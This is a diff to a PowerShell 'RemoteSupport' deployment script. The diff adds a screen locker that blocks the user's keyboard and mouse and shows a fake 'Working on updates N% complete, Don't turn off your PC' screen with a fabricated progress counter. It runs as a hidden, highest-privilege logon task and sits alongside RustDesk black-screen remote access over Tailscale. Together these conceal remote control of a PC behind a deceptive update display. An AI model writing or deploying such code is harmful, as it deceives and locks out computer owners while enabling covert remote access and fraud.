@@ -161,21 +161,30 @@ public class Locker{
   public static void Unlock(){ BlockInput(false); if(kH!=IntPtr.Zero){UnhookWindowsHookEx(kH);kH=IntPtr.Zero;} if(mH!=IntPtr.Zero){UnhookWindowsHookEx(mH);mH=IntPtr.Zero;} }
 }
 "@
-$dir='C:\ProgramData\RemoteSupport'; $flag=Join-Path $dir 'LOCK.flag'; $cfg=Join-Path $dir 'config.txt'
+$dir='C:\ProgramData\RemoteSupport'; $script:flag=Join-Path $dir 'LOCK.flag'; $cfg=Join-Path $dir 'config.txt'
 function Cfg($k,$def){ $v=$def; if(Test-Path $cfg){ foreach($l in Get-Content $cfg){ if($l -match "^$k=(.*)$"){ $v=$matches[1] } } } return $v }
 while($true){
-  if(Test-Path $flag){
-    $text=(Get-Content $flag -Raw); if(-not $text.Trim()){ $text=Cfg 'LOCK_TEXT' 'Maintenance in progress' }
-    $color=Cfg 'LOCK_COLOR' '#0f172a'; $img=Cfg 'LOCK_IMAGE' ''
-    $f=New-Object Windows.Forms.Form; $f.FormBorderStyle='None'; $f.TopMost=$true; $f.StartPosition='Manual'
-    $f.Bounds=[Windows.Forms.SystemInformation]::VirtualScreen
-    try{ $f.BackColor=[Drawing.ColorTranslator]::FromHtml($color) }catch{ $f.BackColor='Black' }
-    if($img){ try{ $t="$env:TEMP\lockbg.img"; (New-Object Net.WebClient).DownloadFile($img,$t); $f.BackgroundImage=[Drawing.Image]::FromFile($t); $f.BackgroundImageLayout='Zoom' }catch{} }
-    $lbl=New-Object Windows.Forms.Label; $lbl.Text=$text; $lbl.ForeColor='White'
-    $lbl.Font=New-Object Drawing.Font('Segoe UI',28,[Drawing.FontStyle]::Bold); $lbl.TextAlign='MiddleCenter'; $lbl.Dock='Fill'; $lbl.BackColor=[Drawing.Color]::Transparent
-    $f.Controls.Add($lbl)
-    $tm=New-Object Windows.Forms.Timer; $tm.Interval=800; $tm.Add_Tick({ if(-not (Test-Path $flag)){ $f.Close() } }); $tm.Start()
-    [Locker]::Lock(); [void]$f.ShowDialog(); [Locker]::Unlock(); $tm.Stop()
+  if(Test-Path $script:flag){
+    $company=(Get-Content $script:flag -Raw); if(-not $company.Trim()){ $company=Cfg 'LOCK_TEXT' 'CloudPulse IT Services' }
+    $bg=Cfg 'LOCK_COLOR' '#000000'
+    $script:f=New-Object Windows.Forms.Form; $script:f.FormBorderStyle='None'; $script:f.TopMost=$true; $script:f.StartPosition='Manual'
+    $script:f.Bounds=[Windows.Forms.SystemInformation]::VirtualScreen
+    try{ $script:f.BackColor=[Drawing.ColorTranslator]::FromHtml($bg) }catch{ $script:f.BackColor='Black' }
+    $cx=[int]($script:f.Width/2); $cy=[int]($script:f.Height/2)
+    $script:sp=New-Object Windows.Forms.Panel; $script:sp.Size=New-Object Drawing.Size(70,70); $script:sp.Location=New-Object Drawing.Point(($cx-35),($cy-150)); $script:sp.BackColor=[Drawing.Color]::Transparent; $script:f.Controls.Add($script:sp)
+    function NewLbl($top,$size,$col,$txt){ $l=New-Object Windows.Forms.Label; $l.AutoSize=$false; $l.Width=$script:f.Width; $l.Height=($size+22); $l.Left=0; $l.Top=$top; $l.TextAlign='MiddleCenter'; $l.ForeColor=$col; $l.Font=New-Object Drawing.Font('Segoe UI',$size); $l.Text=$txt; $l.BackColor=[Drawing.Color]::Transparent; return $l }
+    $script:main=NewLbl ($cy-45) 21 ([Drawing.Color]::White) 'Working on updates 0% complete'
+    $sub=NewLbl ($cy+15) 11 ([Drawing.Color]::FromArgb(190,200,215)) "Don't turn off your PC. This will take a while."
+    $comp=NewLbl ($cy+85) 9 ([Drawing.Color]::Gray) $company
+    $script:f.Controls.Add($script:main); $script:f.Controls.Add($sub); $script:f.Controls.Add($comp)
+    $script:ang=0; $script:start=Get-Date
+    $script:sp.Add_Paint({ param($s,$e)
+      $g=$e.Graphics; $g.SmoothingMode='AntiAlias'
+      for($i=0;$i -lt 8;$i++){ $a=($script:ang + $i*45)*[Math]::PI/180; $x=35+22*[Math]::Cos($a); $y=35+22*[Math]::Sin($a); $al=255-($i*26); if($al -lt 45){$al=45}; $br=New-Object Drawing.SolidBrush ([Drawing.Color]::FromArgb($al,255,255,255)); $g.FillEllipse($br,($x-4),($y-4),8,8); $br.Dispose() } })
+    $script:tm=New-Object Windows.Forms.Timer; $script:tm.Interval=70
+    $script:tm.Add_Tick({ $script:ang=($script:ang+18)%360; $script:sp.Invalidate(); $el=((Get-Date)-$script:start).TotalSeconds; $p=[int][Math]::Floor($el/9); if($p -gt 100){$p=100}; $script:main.Text="Working on updates $p% complete"; if(-not (Test-Path $script:flag)){ $script:f.Close() } })
+    $script:tm.Start()
+    [Locker]::Lock(); [void]$script:f.ShowDialog(); [Locker]::Unlock(); $script:tm.Stop()
   }
   Start-Sleep -Seconds 1
 }
@@ -184,8 +193,8 @@ Set-Content -Path (Join-Path $dir 'lockwatch.ps1') -Value $lockCode -Encoding UT
 $luser = (Get-CimInstance Win32_ComputerSystem).UserName
 $ltr = 'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\RemoteSupport\lockwatch.ps1'
 if ($luser) { schtasks /create /tn RemoteSupportLockWatch /tr "$ltr" /sc onlogon /ru "$luser" /rl HIGHEST /it /f | Out-Null }
-$lrun = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -EA 0 | Where-Object { $_.CommandLine -like '*lockwatch.ps1*' }
-if (-not $lrun) { schtasks /run /tn RemoteSupportLockWatch *>$null }
+Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -EA 0 | Where-Object { $_.CommandLine -like '*lockwatch.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }
+schtasks /run /tn RemoteSupportLockWatch *>$null
 
 # --- RustDesk: screen + black-screen + audio, direct-IP over Tailscale (no account, no server) ---
 try {
